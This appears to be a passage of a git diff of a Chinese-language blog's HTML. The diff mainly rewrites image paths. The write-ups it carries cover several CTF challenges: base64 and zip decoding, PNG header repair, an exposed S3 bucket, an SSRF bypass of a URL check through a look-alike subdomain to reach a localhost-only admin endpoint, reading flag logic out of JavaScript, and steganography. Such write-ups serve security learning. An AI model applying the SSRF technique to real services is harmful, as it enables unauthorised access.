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&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> base64Decode(str)&#123;</span><br><span class="line">    <span class="built_in">return</span> atob(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var decodedStr = base64Decode(encodedStr);</span><br><span class="line">console.log(decodedStr)</span><br></pre></td></tr></table></figure>
 <p>他最後有提到這串是b64的加密</p>
-<p><img src="img/hackthonkor_5.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_5.png" alt="Untitled"></p>
 <p>這邊看到PK開頭，是zip檔的標頭檔，下載成zip解開</p>
 <p>在document.xml檔案中看到</p>
-<p><img src="img/hackthonkor_6.png" alt="Untitled"></p>
-<p><img src="img/hackthonkor_7.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_6.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_7.png" alt="Untitled"></p>
 <hr>
 <h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><p>png在winhex打開後發現不完整，所以需要填充一些字節進去</p>
-<p><img src="img/hackthonkor_8.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_8.png" alt="Untitled"></p>
 <p>儲存後打開文件 s1gnatur35_Are_v3ry_1mp0rtant_1n_th3_5tructur3_of_fil3s</p>
-<p><img src="img/hackthonkor_9.png" alt="Untitled"></p>
-<p><img src="img/hackthonkor_10.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_9.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_10.png" alt="Untitled"></p>
 <hr>
-<h3 id="Dog-Gallery"><a href="#Dog-Gallery" class="headerlink" title="Dog Gallery"></a><strong>Dog Gallery</strong></h3><p><img src="img/hackthonkor_11.png" alt="Untitled"></p>
+<h3 id="Dog-Gallery"><a href="#Dog-Gallery" class="headerlink" title="Dog Gallery"></a><strong>Dog Gallery</strong></h3><p><img src="/img/hackthonkor_11.png" alt="Untitled"></p>
 <p>開啟網頁是一堆可愛的狗狗</p>
 <p>針對圖片查看儲存位置，是<strong>S3 bucket的部分</strong></p>
-<p><img src="img/hackthonkor_12.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_12.png" alt="Untitled"></p>
 <p>開啟該網頁查看</p>
-<p><img src="img/hackthonkor_13.png" alt="Untitled"></p>
-<p><img src="img/hackthonkor_14.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_13.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_14.png" alt="Untitled"></p>
 <hr>
 <h3 id="GithubReadme"><a href="#GithubReadme" class="headerlink" title="GithubReadme"></a><strong>GithubReadme</strong></h3><blockquote>
 <p>這題首先感謝我隊友的朋友在賽後無私的分享他的做法，我也是針對他的 writeup 進行研究，受益良多!!!</p>
 </blockquote>
 <p>這題允許閱讀git respository，按照慣例，去找網頁原始碼查看</p>
-<p><img src="img/hackthonkor_15.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_15.png" alt="Untitled"></p>
 <p>這邊可以注意到 <code>/api/view</code> 、 <code>/api/admin</code> 頁面</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api.post(<span class="params"><span class="string">&quot;/view&quot;</span>, response=&#123;<span class="number">200</span>: <span class="built_in">str</span>, <span class="number">400</span>: Error&#125;</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">request, path: Path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = get_client_ip(request)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> ReqLog.objects.<span class="built_in">filter</span>(ip=ip, request_at__gt=timezone.now() - timedelta(seconds=<span class="number">10</span>)).exists():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">400</span>, &#123;<span class="string">&#x27;msg&#x27;</span>: <span class="string">f&quot;so Fast.. - <span class="subst">&#123;ip&#125;</span>&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ReqLog(ip=ip).save()</span><br><span class="line">        github = Github.objects.<span class="built_in">filter</span>(path=path)</span><br><span class="line">        <span class="keyword">if</span> github.exists():</span><br><span class="line">            <span class="keyword">return</span> github.first().readme</span><br><span class="line">        url = <span class="string">f&quot;&lt;https://raw.githubusercontent.com&gt;<span class="subst">&#123;path.path&#125;</span>/<span class="subst">&#123;path.branch_name&#125;</span>/README.md&quot;</span></span><br><span class="line">        URLValidator()(url)</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">400</span>, &#123;&#125;</span><br><span class="line">        readme = response.text</span><br><span class="line">        Github(</span><br><span class="line">            path=path,</span><br><span class="line">            readme=readme</span><br><span class="line">        ).save()</span><br><span class="line">        <span class="keyword">return</span> readme</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">400</span>, &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api.get(<span class="params"><span class="string">&quot;/admin&quot;</span>, response=&#123;<span class="number">200</span>: <span class="built_in">dict</span>, <span class="number">401</span>: Error&#125;</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    client_ip, is_routable = get_client_ip(request)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_routable :</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;msg&#x27;</span>:os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">401</span>, &#123;<span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ACCESS DENIED&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -1841,7 +1841,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <p>在這邊 <code>URLValidator()(url)</code>的作用是檢查建構的 URL 是否符合 URL 的格式要求</p>
 <p>那如何有效的接上前面的domain並對其進行訪問?</p>
 <p>這時就用到了<strong>DNS Record for Subdomain的技術</strong></p>
-<p><img src="img/hackthonkor_16.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_16.png" alt="Untitled"></p>
 <p>先來詳細說明這部分:</p>
 <ul>
 <li><p>子網域配置：</p>
@@ -1920,7 +1920,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <p>當造訪raw.githubusercontent.com.vicevirus.me時，請求將會重新導向至HTTPS，並透過SSL進行安全傳輸</p>
 <p>所以總結來說就是 : 設置A紀錄 &gt; 配置重定向規則 &gt; 配置SSL證書 &gt; 加載web server</p>
 <p>最後一步，將domain 傳遞給：<code>/api/view</code></p>
-<p><img src="img/hackthonkor_17.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_17.png" alt="Untitled"></p>
 <p>參考資料</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.namecheap.com/support/knowledgebase/article.aspx/9776/2237/how-to-create-a-subdomain-for-my-domain/">如何為我的域名創建子功能變數名稱 - 功能變數名稱 - Namecheap.com</a></li>
@@ -1930,10 +1930,10 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <li><a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/current/mod/mod_ssl.html">mod_ssl - Apache HTTP Server 版本 2.4</a></li>
 </ul>
 <hr>
-<h3 id="Revact"><a href="#Revact" class="headerlink" title="Revact"></a><strong>Revact</strong></h3><p><img src="img/hackthonkor_18.png" alt="Untitled"></p>
+<h3 id="Revact"><a href="#Revact" class="headerlink" title="Revact"></a><strong>Revact</strong></h3><p><img src="/img/hackthonkor_18.png" alt="Untitled"></p>
 <p>這網站會檢查你輸入的內容，可以透過這js查看到網站的資訊</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://d1rov3aw0q2u2y.cloudfront.net/static/js/main.5e39c7c2.js</span><br></pre></td></tr></table></figure>
-<p><img src="img/hackthonkor_19.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_19.png" alt="Untitled"></p>
 <p>從js中可以看到一些程式片段也許是跟flag提示相關的</p>
 <ul>
 <li>endsWith &amp;&amp; startsWith 都是 ‘X’</li>
@@ -1958,11 +1958,11 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <li>[1] - 5 ⇒ 66</li>
 <li>[1] ⇒ 71 ⇒ G</li>
 </ul>
-<p><img src="img/hackthonkor_20.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_20.png" alt="Untitled"></p>
 <ul>
 <li>ANS : <code>XG@@DzX</code></li>
 </ul>
-<p><img src="img/hackthonkor_21.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_21.png" alt="Untitled"></p>
 <hr>
 <h3 id="PNGRST"><a href="#PNGRST" class="headerlink" title="PNGRST"></a>PNGRST</h3><p>這題在比賽結束後兩小時，隊友才解出來，原本以為是要取那些座標區域去把那些區域的圖片才切下來，結果證實我的想法不對呵呵</p>
 <p>還是要靠forensic大大來拯救</p>
@@ -1971,9 +1971,9 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <li><a target="_blank" rel="noopener" href="https://29a.ch/photo-forensics/#forensic-magnifier">https://29a.ch/photo-forensics/#forensic-magnifier</a></li>
 </ul>
 <p>這題給了一張圖片</p>
-<p><img src="img/hackthonkor_22.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_22.png" alt="Untitled"></p>
 <p>感謝隊友的提示</p>
-<p><img src="img/hackthonkor_23.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_23.png" alt="Untitled"></p>
 <p>這題用zsteg可以看到一些座標位置，但這看起來並不完整</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/upload_file_web]</span><br><span class="line">└─# zsteg present.png </span><br><span class="line">[?] 11 bytes of extra data after image end (IEND), offset = 0x1822b4</span><br><span class="line">extradata:0         .. text: <span class="string">&quot;(X,Y) (2,5)&quot;</span></span><br><span class="line">imagedata           .. text: <span class="string">&quot;(((101999\&quot;\&quot;\&quot;&quot;</span></span><br><span class="line">b1,g,lsb,xy         .. text: <span class="string">&quot;(8,5), (8,6), (8,7), (8,8), (8,9), (8,10), (8,11), (8,12), (8,93), (8,94), (8,95), (8,96), (8,97), (8,98), (8,99), (8,100), (8,157), (8,158), (8,159), (8,160), (8,161), (8,162), (8,163), (8,164), (8,165), (8,166), (8,167), (8,168), (8,169), (8,170), (8,171&quot;</span></span><br><span class="line">b1,rgb,lsb,xy       .. file: Commodore PET BASIC program, offset 0x0100, line 36, token (0x1)</span><br><span class="line">b1,rgb,msb,xy       .. file: tar archive (old), <span class="built_in">type</span> <span class="string">&#x27;\200&#x27;</span> \200 , mode  \001\2, uid \200$, gid @\200\0, size  \001\200, seconds  \001\200\0, linkname $, comment: \001</span><br><span class="line">b2,b,lsb,xy         .. text: [<span class="string">&quot;U&quot;</span> repeated 8 <span class="built_in">times</span>]</span><br><span class="line">b4,g,msb,xy         .. file: Applesoft BASIC program data, first line number 8</span><br><span class="line">b4,rgb,lsb,xy       .. file: Adobe Photoshop Color swatch, version 0, 1 colors; 1st RGB space (0), w 0x100, x 0, y 0, z 0</span><br><span class="line">b4,rgb,msb,xy       .. file: Adobe Photoshop Color swatch, version 0, 128 colors; 1st RGB space (0), w 0x8000, x 0, y 0, z 0; 2nd space (128), w 0x8, x 0x8000, y 0, z 0 </span><br></pre></td></tr></table></figure>
 <p>所以將該字段的全部內容導出到txt中查看</p>
@@ -1981,7 +1981,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <p>雖然導出後，後面會參雜一堆亂碼，因為檔案內容很多，所以我打算寫到txt檔案中，再由腳本讀取</p>
 <p>接下來需要寫腳本把這些區塊的內容顯示出來</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import re</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 讀取儲存座標的txt檔案</span></span><br><span class="line">with open(<span class="string">&#x27;coor.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) as file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將每一行轉換為座標並儲存在清單中</span></span><br><span class="line">coordinates = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="comment"># 使用正則表達式找到所有座標對，並將其轉換為座標</span></span><br><span class="line">    matches = re.findall(r<span class="string">&#x27;\((\d+),(\d+)\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">for</span> match <span class="keyword">in</span> matches:</span><br><span class="line">        x, y = map(int, match)</span><br><span class="line">        coordinates.append((x, y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分離x和y座標</span></span><br><span class="line">x_coords = [coord[0] <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates]</span><br><span class="line">y_coords = [coord[1] <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 繪製座標點</span></span><br><span class="line">plt.scatter(x_coords, y_coords)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Coordinates in XY-plane&#x27;</span>)</span><br><span class="line">plt.grid(True)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="img/hackthonkor_24.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_24.png" alt="Untitled"></p>
 <p> <code>I_LOVE_XY</code></p>
 <p>參考資料</p>
 <ul>
@@ -1992,9 +1992,9 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 </ul>
 <hr>
 <p>通過這次競賽，學到了很多，我很感謝隊友在賽後給我的幫助，我也因此結識到很棒的朋友，也是引領著自己繼續前進，希望有天能追上大家的腳步!!</p>
-<p><img src="img/hackthonkor_25.png" alt="Untitled"></p>
-<p><img src="img/hackthonkor_26.png" alt="Untitled"></p>
-<p><img src="img/hackthonkor_27.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_25.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_26.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_27.png" alt="Untitled"></p>
 <hr>
 <p>其它Writeup參考</p>
 <ul>
@@ -2079,7 +2079,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <p>簡單來說就是讓一個物件取得另一個物件的屬性與方法，這就是繼承的概念</p>
 <p>每個物件都連結到某種類型的另一個物件，稱為其原型</p>
 <p>JS 的繼承系統會透過prototype chain連接到其他物件功能，這就是原型繼承</p>
-<p><img src="img/GoogleCTFCSP.png" alt="Untitled"></p>
+<p><img src="/img/GoogleCTFCSP.png" alt="Untitled"></p>
 <p>For example:</p>
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name) <span class="comment">//&quot;test&quot;</span></span><br></pre></td></tr></table></figure>
 <p>此時的name是不具備屬性和方法的</p>
